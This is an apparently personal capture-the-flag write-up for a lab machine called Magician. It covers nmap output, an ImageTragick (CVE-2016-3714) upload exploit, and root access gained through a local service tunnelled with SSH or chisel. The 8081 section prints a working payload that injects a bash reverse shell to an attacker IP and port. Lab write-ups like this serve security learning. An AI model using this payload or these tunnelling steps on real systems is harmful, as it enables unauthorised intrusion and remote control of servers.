##Magician

tag CVE-2016-3714
add magician to /etc/hosts

#Enumeration
```
# Nmap 7.91 scan initiated Sun Feb 21 19:53:49 2021 as: nmap -sC -sV -oN nmap/initial -vvv -p 21,8080,8081 10.10.171.198
Nmap scan report for magician (10.10.171.198)
Host is up, received echo-reply ttl 61 (0.15s latency).
Scanned at 2021-02-21 19:53:50 PST for 38s

PORT     STATE SERVICE    REASON         VERSION
21/tcp   open  ftp        syn-ack ttl 61 vsftpd 2.0.8 or later
8080/tcp open  http-proxy syn-ack ttl 61
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Content-Type: application/json
|     Date: Mon, 22 Feb 2021 03:53:59 GMT
|     Connection: close
|     {"timestamp":"2021-02-22T03:53:59.336+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest:
|     HTTP/1.1 404
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Content-Type: application/json
|     Date: Mon, 22 Feb 2021 03:53:58 GMT
|     Connection: close
|     {"timestamp":"2021-02-22T03:53:58.219+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}
|   HTTPOptions:
|     HTTP/1.1 404
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Content-Type: application/json
|     Date: Mon, 22 Feb 2021 03:53:58 GMT
|     Connection: close
|     {"timestamp":"2021-02-22T03:53:58.649+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}
|   RTSPRequest:
|     HTTP/1.1 505
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Mon, 22 Feb 2021 03:53:58 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505
|_    HTTP Version Not Supported</h1></body></html>
|_http-title: Site doesn't have a title (application/json).
8081/tcp open  http       syn-ack ttl 61 nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: CA4D0E532A1010F93901DFCB3A9FC682
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: magician
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=2/21%Time=60332AD5%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,13B,"HTTP/1\.1\x20404\x20\r\nVary:\x20Origin\r\nVary:\x20Acces
SF:s-Control-Request-Method\r\nVary:\x20Access-Control-Request-Headers\r\n
SF:Content-Type:\x20application/json\r\nDate:\x20Mon,\x2022\x20Feb\x202021
SF:\x2003:53:58\x20GMT\r\nConnection:\x20close\r\n\r\n{\"timestamp\":\"202
SF:1-02-22T03:53:58\.219\+0000\",\"status\":404,\"error\":\"Not\x20Found\"
SF:,\"message\":\"No\x20message\x20available\",\"path\":\"/\"}")%r(HTTPOpt
SF:ions,13B,"HTTP/1\.1\x20404\x20\r\nVary:\x20Origin\r\nVary:\x20Access-Co
SF:ntrol-Request-Method\r\nVary:\x20Access-Control-Request-Headers\r\nCont
SF:ent-Type:\x20application/json\r\nDate:\x20Mon,\x2022\x20Feb\x202021\x20
SF:03:53:58\x20GMT\r\nConnection:\x20close\r\n\r\n{\"timestamp\":\"2021-02
SF:-22T03:53:58\.649\+0000\",\"status\":404,\"error\":\"Not\x20Found\",\"m
SF:essage\":\"No\x20message\x20available\",\"path\":\"/\"}")%r(RTSPRequest
SF:,259,"HTTP/1\.1\x20505\x20\r\nContent-Type:\x20text/html;charset=utf-8\
SF:r\nContent-Language:\x20en\r\nContent-Length:\x20465\r\nDate:\x20Mon,\x
SF:2022\x20Feb\x202021\x2003:53:58\x20GMT\r\n\r\n<!doctype\x20html><html\x
SF:20lang=\"en\"><head><title>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTT
SF:P\x20Version\x20Not\x20Supported</title><style\x20type=\"text/css\">bod
SF:y\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x
SF:20{color:white;background-color:#525D76;}\x20h1\x20{font-size:22px;}\x2
SF:0h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:
SF:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;background-color
SF::#525D76;border:none;}</style></head><body><h1>HTTP\x20Status\x20505\x2
SF:0\xe2\x80\x93\x20HTTP\x20Version\x20Not\x20Supported</h1></body></html>
SF:")%r(FourOhFourRequest,15E,"HTTP/1\.1\x20404\x20\r\nVary:\x20Origin\r\n
SF:Vary:\x20Access-Control-Request-Method\r\nVary:\x20Access-Control-Reque
SF:st-Headers\r\nContent-Type:\x20application/json\r\nDate:\x20Mon,\x2022\
SF:x20Feb\x202021\x2003:53:59\x20GMT\r\nConnection:\x20close\r\n\r\n{\"tim
SF:estamp\":\"2021-02-22T03:53:59\.336\+0000\",\"status\":404,\"error\":\"
SF:Not\x20Found\",\"message\":\"No\x20message\x20available\",\"path\":\"/n
SF:ice%20ports%2C/Tri%6Eity\.txt%2ebak\"}");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 21 19:54:28 2021 -- 1 IP address (1 host up) scanned in 38.50 seconds
```
#FTP
allows anonymous login after a delay but simply instructs to imagetragik.com to discuss the cve vulnerability

#8080
Enumeration here finds a /file directory which provides a json listing of files uploaded from port 8081

#8081
This allows us to upload pngs to be converted into jpgs
We need to adjust our imagetragik payload to be able to provide us a reverse shell through this exploitable conversion using imagemagick
fill 'url(https://IP/logo.dbb7e574.png";bash -c \'bash -i >& /dev/tcp/IP/PORT 0>&1\'")'
ends up being a usable payload, seems like url format needs to be 
https://[url]/image.png";[RCE]")'

We find the user flag in the magician home directory
```
cat the_magic_continues
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
magician@magician:~$
```

locally listening seems to imply we should check what ports are open locally so
we run the following
```
ss -tunlp
Netid State   Recv-Q  Send-Q          Local Address:Port     Peer Address:Port
udp   UNCONN  0       0               127.0.0.53%lo:53            0.0.0.0:*
udp   UNCONN  0       0           10.10.197.57%eth0:68            0.0.0.0:*
tcp   LISTEN  0       128             127.0.0.53%lo:53            0.0.0.0:*
tcp   LISTEN  0       128                 127.0.0.1:6666          0.0.0.0:*
tcp   LISTEN  0       128                   0.0.0.0:8081          0.0.0.0:*
tcp   LISTEN  0       32                          *:21                  *:*
tcp   LISTEN  0       100                         *:8080                *:*      users:(("java",pid=1004,fd=25))
```
so lets forward this port us remotely through an ssh tunnel. We can forward this post to ourselves through the following

ssh -R 6666:localhost:6666[user]@[local ip]

#Chisel method
wget the chisel binary from our machine

on target 
```
./chisel client [our ip]:[our port] R:[open local port]:127.0.0.1:6666
```
on our machine
chisel server --reverse --port [our port]


we can then set up an http proxy on port 6666 for localhost and we are presented a new page when we go to magician:8080 seems like we can read files from the system but with root privilege so we simply choose the file /root/root.txt and we have our flag
